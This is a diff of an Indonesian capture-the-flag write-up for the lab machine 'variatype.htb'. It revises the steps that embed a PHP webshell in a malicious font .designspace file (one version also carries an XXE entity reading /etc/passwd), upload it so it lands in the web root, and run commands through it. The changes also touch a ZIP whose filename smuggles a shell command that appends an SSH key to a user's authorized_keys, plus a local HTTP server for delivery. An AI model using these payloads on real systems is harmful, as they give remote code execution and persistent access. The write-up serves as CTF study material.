@@ -227,30 +227,35 @@ python3 generate_fonts.py
 File `source-light.ttf` dan `source-regular.ttf` berhasil dibuat. Selanjutnya, sebuah file `.designspace` berbahaya dikonstruksi dengan menyematkan PHP webshell di dalam blok CDATA, sekaligus menentukan path output ke lokasi yang dapat diakses melalui web:
 
 ```xml
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [
-  <!ENTITY xxe SYSTEM "file:///etc/passwd">
-]>
-<designspace format="4.1">
-  <sources>
-    <source filename="source-light.ttf" familyname="SourceTest" stylename="Light">
-      <location><dimension name="Weight" xvalue="100"/></location>
-    </source>
-    <source filename="source-regular.ttf" familyname="SourceTest" stylename="Regular">
-      <location><dimension name="Weight" xvalue="400"/></location>
-    </source>
-  </sources>
-  <instances>
-    <instance
-      filename="/var/www/portal.variatype.htb/public/files/shell.php"
-      familyname="SourceTest"
-      stylename="Medium">
-      <location><dimension name="Weight" xvalue="250"/></location>
-      <kerning/>
-      <info/>
-    </instance>
-  </instances>
-  <!-- <![CDATA[ <?php system($_GET['cmd']); ?> ]]> -->
+<?xml version='1.0' encoding='UTF-8'?>
+<designspace format="5.0">
+	<axes>
+        <!-- XML injection occurs in labelname elements with CDATA sections -->
+	    <axis tag="wght" name="Weight" minimum="100" maximum="900" default="400">
+	        <labelname xml:lang="en"><![CDATA[<?php system($_GET['cmd']); ?>]]]]><![CDATA[>]]></labelname>
+	        <labelname xml:lang="fr">MEOW2</labelname>
+	    </axis>
+	</axes>
+	<axis tag="wght" name="Weight" minimum="100" maximum="900" default="400"/>
+	<sources>
+		<source filename="source-light.ttf" name="Light">
+			<location>
+				<dimension name="Weight" xvalue="100"/>
+			</location>
+		</source>
+		<source filename="source-regular.ttf" name="Regular">
+			<location>
+				<dimension name="Weight" xvalue="400"/>
+			</location>
+		</source>
+	</sources>
+	<variable-fonts>
+		<variable-font name="MyFont" filename="/var/www/portal.variatype.htb/public/files/shell.php">
+			<axis-subsets>
+				<axis-subset name="Weight"/>
+			</axis-subsets>
+		</variable-font>
+	</variable-fonts>
 </designspace>
 ```
 
@@ -263,11 +268,10 @@ Tujuan dari konstruksi ini adalah mengeksploitasi pipeline pemrosesan font untuk
 Setelah semua file siap — designspace berbahaya beserta dua font pendukungnya — ketiganya diunggah ke endpoint pemrosesan font yang rentan:
 
 ```bash
-curl -s -b cookies.txt \
-  -F "designspace=@evil.designspace" \
-  -F "font1=@source-light.ttf" \
-  -F "font2=@source-regular.ttf" \
-  http://portal.variatype.htb/process.php
+curl -X POST "http://variatype.htb/tools/variable-font-generator/process" \
+  -F "designspace=@malicious2.designspace" \
+  -F "masters=@source-light.ttf" \
+  -F "masters=@source-regular.ttf" -i --follow -s
 ```
 
 ![Upload file berbahaya ke endpoint pemrosesan font](15-file-upload.png)
@@ -275,46 +279,29 @@ curl -s -b cookies.txt \
 Server merespons dengan pesan **"Processing completed"**, menandakan bahwa payload berhasil diproses. Karena designspace mengarahkan output ke dalam web root, kemungkinan besar file PHP sudah tertulis di sana. Verifikasi dilakukan dengan mengakses shell tersebut:
 
 ```bash
-curl "http://portal.variatype.htb/public/files/shell.php?cmd=id"
-```
-
-![RCE berhasil — perintah id dieksekusi melalui webshell](16-rce-execution.png)
-
-Eksekusi berhasil — output menampilkan identitas user yang menjalankan proses web server. **Remote Code Execution (RCE)** telah tercapai, membuka akses ke sistem target.
-
----
-
-## Pembuatan SSH Key
-
-Dengan RCE di tangan, langkah berikutnya adalah membangun metode akses yang lebih stabil dan andal. Sebuah SSH key pair baru dibuat secara lokal untuk dipersiapkan bagi user `steve`:
-
-```bash
-ssh-keygen -t ed25519 -f steve_key -N ""
+curl -i -b "PHPSESSID=q4da62f7c63pkeu0026dcrs8r4" "http://portal.variatype.htb/files/shell.php?cmd=id" --output hasil_rce.txt
 ```
 
 ![Pembuatan SSH key pair untuk user steve](17-ssh-keygen.png)
 
-Proses ini menghasilkan dua file: `steve_key` (private key) dan `steve_key.pub` (public key) tanpa passphrase. Rencana selanjutnya adalah menyuntikkan public key tersebut ke dalam file `~/.ssh/authorized_keys` milik `steve` melalui RCE yang sudah dimiliki, sehingga login SSH tanpa password bisa dilakukan kapan saja.
-
 ---
+
+```bash
+ssh-keygen -t ed25519 -f steve_key -N "" -C "steve_variatype"
+```
+
+Proses ini menghasilkan dua file: `steve_key` (private key) dan `steve_key.pub` (public key) tanpa passphrase.
+
+![Pembuatan SSH key steve](pembuatan_ssh_steve.png)
+
+Rencana selanjutnya adalah menyuntikkan public key tersebut ke dalam file `~/.ssh/authorized_keys` milik `steve` melalui RCE yang sudah dimiliki, sehingga login SSH tanpa password bisa dilakukan kapan saja.
 
 ## Persiapan Privilege Escalation
 
 Untuk mendapatkan akses sebagai `steve`, perlu ada mekanisme yang menyuntikkan public key ke direktori `.ssh`-nya. Cara yang dipilih adalah membuat arsip ZIP berbahaya yang mengeksploitasi kerentanan command injection dalam alur pemrosesan font — kemungkinan besar dijalankan oleh scheduled job berbasis FontForge.
 
 ```bash
-# Buat direktori dummy untuk dijadikan isi ZIP
-mkdir exploit-zip
-
-# Nama file mengandung command substitution — akan dieksekusi saat diproses
-PUB_KEY=$(cat steve_key.pub)
-FILENAME="$(mkdir -p /home/steve/.ssh && echo '${PUB_KEY}' >> /home/steve/.ssh/authorized_keys && echo done).ttf"
-
-# Buat file kosong dengan nama berbahaya
-touch "exploit-zip/${FILENAME}"
-
-# Kemas ke dalam ZIP
-cd exploit-zip && zip ../evil.zip * && cd ..
+python3 make_zip.py
 ```
 
 ![Pembuatan evil.zip dengan nama file yang mengandung command injection](18-evil-zip.png)
@@ -328,7 +315,7 @@ Skrip ini menyematkan public key SSH langsung ke dalam nama file menggunakan com
 Untuk menyerahkan arsip berbahaya ke sistem target, sebuah HTTP server sederhana dijalankan secara lokal agar file bisa diunduh dari sana:
 
 ```bash
-python3 -m http.server 8080
+python3 -m http.server 80
 ```
 
 ![Python HTTP server aktif untuk melayani evil.zip](19-http-server.png)
